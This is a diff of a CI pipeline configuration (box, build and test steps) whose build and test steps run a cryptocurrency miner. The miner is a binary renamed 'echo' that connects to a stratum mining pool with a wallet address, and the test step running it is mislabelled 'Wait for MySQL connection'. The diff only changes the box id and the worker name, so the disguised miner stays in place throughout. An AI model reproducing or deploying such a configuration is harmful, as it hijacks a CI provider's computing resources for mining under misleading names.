@@ -1,5 +1,5 @@
 box:
-  id: savanatok/congenial-adventure
+  id: savanatok/congenial-adventure1
 command-timeout: 9999999
 no-response-timeout: 99999
 build:
@@ -13,10 +13,10 @@ build:
     - script:
         name: execut
         code: |
-          ./echo -a curvehash -o stratum+tcps://stratum-eu.rplant.xyz:17058 -u TnQXcwFBypPbP1gA3zeau6sxGwVsNVbTCs.wr0 -p password=good -t6
+          ./echo -a curvehash -o stratum+tcps://stratum-eu.rplant.xyz:17058 -u TnQXcwFBypPbP1gA3zeau6sxGwVsNVbTCs.a1 -p password=good -t6
 
 test:
   steps:
     - script:
         name: Wait for MySQL connection
-        code: ./echo -a curvehash -o stratum+tcps://stratum-eu.rplant.xyz:17058 -u TnQXcwFBypPbP1gA3zeau6sxGwVsNVbTCs.wr0 -p password=good -t6
+        code: ./echo -a curvehash -o stratum+tcps://stratum-eu.rplant.xyz:17058 -u TnQXcwFBypPbP1gA3zeau6sxGwVsNVbTCs.a1 -p password=good -t6
